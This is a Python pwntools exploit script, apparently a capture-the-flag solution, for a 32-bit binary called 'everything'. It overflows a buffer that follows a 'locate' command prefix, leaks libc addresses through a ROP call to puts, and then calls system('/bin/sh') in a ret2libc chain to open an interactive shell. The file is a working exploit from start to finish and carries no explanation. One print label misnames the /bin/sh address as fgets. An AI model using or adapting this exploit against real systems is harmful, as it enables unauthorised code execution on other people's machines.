from pwn import *

io = process('./everything')
elf = ELF("./everything")
libc = ELF('/lib/i386-linux-gnu/libc-2.26.so')

cmdPrefix = "locate --ignore-case --limit 100 "
def leak(addr):
	dstebp = 0x804C500
	payload = (4096 - len(cmdPrefix)) * 'a'
	payload += 'a' * 16
	payload += 'b' * 4
	payload += p32(elf.plt['puts'])
	payload += p32(0x8048C1B)
	payload += p32(addr)
	io.sendline(payload)
	s = io.recv(4)
	io.recvuntil('#\n')
	return u32(s)


puts_addr = leak(elf.got['puts'])
print "[+] puts " + hex(puts_addr)
fgets_addr = leak(elf.got['fgets'])
print "[+] fgets " + hex(fgets_addr)
libc_base = fgets_addr - libc.sym['fgets']
system_addr = libc.sym['system'] + libc_base
print "[+] system " + hex(system_addr)
binsh_addr = libc.search('/bin/sh\x00').next() + libc_base
print "[+] fgets " + hex(binsh_addr)

payload = (4096 - len(cmdPrefix)) * 'a' + 'a' * 16 + 'b' * 4 
payload += p32(system_addr) * 2 + p32(binsh_addr)
io.sendline(payload)
io.interactive()